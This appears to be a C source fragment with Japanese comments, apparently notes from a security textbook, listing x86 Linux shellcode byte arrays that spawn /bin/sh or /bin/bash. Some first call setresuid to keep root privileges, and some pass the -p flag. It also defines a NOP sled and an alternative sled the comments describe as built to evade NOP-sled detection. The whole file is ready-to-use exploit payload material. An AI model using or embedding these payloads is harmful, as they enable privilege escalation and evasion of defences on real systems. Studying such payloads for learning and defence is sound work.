//書籍のシェルコードをそのまま使用した(35byte)
//やっていることはsetresuidを呼び出した後、shを呼び出すシェルコードと同様
//char shellcode[]= "\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80";

//shを呼び出すシェルコード(25byte)
//char shellcode[] = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80";

//shにpオプションを付加して呼び出すシェルコード(33byte)
//char shellcode[] = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x66\x68\x2d\x70\x89\xe1\x52\x89\xe2\x51\x53\x89\xe1\xcd\x80";

//setresuidを呼び出した後、shを呼び出すシェルコード(35byte)
char shellcode[] = "\x31\xc0\xb0\xa4\x31\xdb\x31\xc9\x99\xcd\x80\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80";

//setresuidを呼び出した後、shにpオプションを付加して呼び出すシェルコード(43byte)
//char shellcode[] = "\x31\xc0\xb0\xa4\x31\xdb\x31\xc9\x99\xcd\x80\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x66\x68\x2d\x70\x89\xe1\x52\x89\xe2\x51\x53\x89\xe1\xcd\x80";

//bashを呼び出すシェルコード(26byte)
//char shellcode[] = "\x6a\x0b\x58\x99\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80";

//bashにpオプションを付加して呼び出すシェルコード(34byte)
//char shellcode[] = "\x6a\x0b\x58\x99\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x66\x68\x2d\x70\x89\xe1\x52\x89\xe2\x51\x53\x89\xe1\xcd\x80";

//setresuidを呼び出した後、bashを呼び出すシェルコード(36byte)
//char shellcode[] = "\x31\xc0\xb0\xa4\x31\xdb\x31\xc9\x99\xcd\x80\x6a\x0b\x58\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80";

//setresuidを呼び出した後、bashにpオプションを付加して呼び出すシェルコード(44byte)
//char shellcode[] = "\x31\xc0\xb0\xa4\x31\xdb\x31\xc9\x99\xcd\x80\x6a\x0b\x58\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x66\x68\x2d\x70\x89\xe1\x52\x89\xe2\x51\x53\x89\xe1\xcd\x80";

//典型的なnopスレッド(40byte)
char nop_sled[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";

//nopスレッドを検出するシステムに対しては、シェルコードの実行に差し支えのないような命令を並べたものをnopスレッドとして使用する(43byte)
//char nop_sled[] = "\x41\x89\xc3\x31\xfe\x5b\x4e\x4e\x31\xd9\x5b\x48\x49\x31\xf0\x31\xf0\x4a\x31\xca\x59\x31\xc3\x41\x58\x89\xca\x58\x48\x31\xc3\x31\xd7\x58\x46\x89\xfe\x31\xc3\x59\x89\xd9\x41";
